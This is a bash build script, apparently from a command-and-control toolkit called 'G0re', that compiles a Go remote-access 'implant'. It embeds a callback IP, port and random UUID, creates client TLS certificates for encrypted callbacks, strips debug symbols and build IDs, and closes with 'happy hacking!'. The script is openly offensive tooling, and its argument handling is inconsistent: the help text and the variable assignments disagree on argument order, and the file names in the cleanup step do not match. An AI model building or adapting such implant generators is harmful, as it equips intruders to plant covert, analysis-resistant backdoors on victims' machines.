#!/bin/bash
#generates a single implant with a UUID from dev/urandom and given user inputs (ip, portnum, name).

#simple funciton to check for a parameter. Not implimented for now.
has_param() {
    local term="$1"
    shift
    for arg; do
        if [[ $arg == "$term" ]]; then
            return 0
        fi
    done
    return 1
}

#"""cool""" banner to show. (I stole it from ASCII fonts)
echo "
  ________ ________                 
 /  _____/ \_____  \_______   ____  
/   \  ___  /   |   \_  __ \_/ __ \ 
\    \_\  \/    |    \  | \/\  ___/ 
 \______  /\_______  /__|    \___  >
        \/         \/            \/ 
    "

if [ $# -lt 1 ] || [ "$1" == "-h" ]; then
    echo "
    [:] This script is invoked as '$0 <ip/hostname> <port> <name>' and needs each of these arguments to correctly run. 
    [:] you can see this help text by invoking the '-h' flag
    "
    exit 0
fi
echo "[:] Generating TLS certificates, ensure gencert.sh has been run, or you have your own certs."
openssl ecparam -name prime256v1 -genkey -noout -out ./implant/client.key

if [ "$4" == "-tls" ]; then 
	echo "[+] generating csr conf file for client."
	
	cat > ./implant/csrclient.conf << EOF                                                                                          
	[ req ]                                                                                                              
	default_bits = 256                                                                          
	prompt = no                                                                                                    
	default_md = sha256                                                                                                  
	req_extensions = req_ext                                                                                             
	distinguished_name = dn                                                                                              
                                                                                                                     
	[ dn ]                                                                                                               
	C = US                                                                                                               
	CN = localhost                                                                                                          
                                                                                                                     
	[ req_ext ]
	keyUsage = keyEncipherment
	extendedKeyUsage = clientAuth
EOF
	
	echo "[+] Generating client csr."
	openssl req -new -key ./implant/client.key -out ./implant/client.csr -config ./implant/csrclient.conf

	echo "[+] Generating signed client key"
	openssl x509 -req -in ./implant/client.csr -CA ./implant/CAcert.pem -CAkey ./tls/CAkey.key -CAcreateserial -out ./implant/client.pem -days 90 -extfile ./implant/csrclient.conf -extensions req_ext
fi
#this only makes a string with length 32, keep in mind the Birthday Paradox. with 61K implants, the chance of collision when generating a new implant 
#is ~35%. The solution is to make UUID's bigger, with size 64 instead of 32 for example.
NEW_UUID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
PORT=$1
IP=$2
NAME=$3
echo "[:]UUID for this implant: $NEW_UUID"
go build -o $3 -ldflags="-X 'main.uuid=$NEW_UUID' -X 'main.ip=$1' -X 'main.port_str=$2' -w -s -buildid=" -trimpath ./implant/implant.go
echo "[+] implant generated, happy hacking!"
#clean TLS files, as they should now be embedded into the implant.
#if has_param "-clean"; then
if [ "$4" == "-clean" ] || [ "$5" == "-clean" ]; then 
echo "[+] Cleaning up client TLS files."
	rm ./implant/client.pem
	echo "[:] Removed client.pem"
	rm ./implant/client.key
	echo "[:] Removed client.key"
	rm ./implant/cacert.pem
	echo "[:] Removed cacert.pem"
	rm ./implant/CAcert.srl client.csr csrclient.conf
	echo "[:] Removed CAcert.srl, client.csr, csrclient.conf."
fi
echo "[:] Terminating shell script"
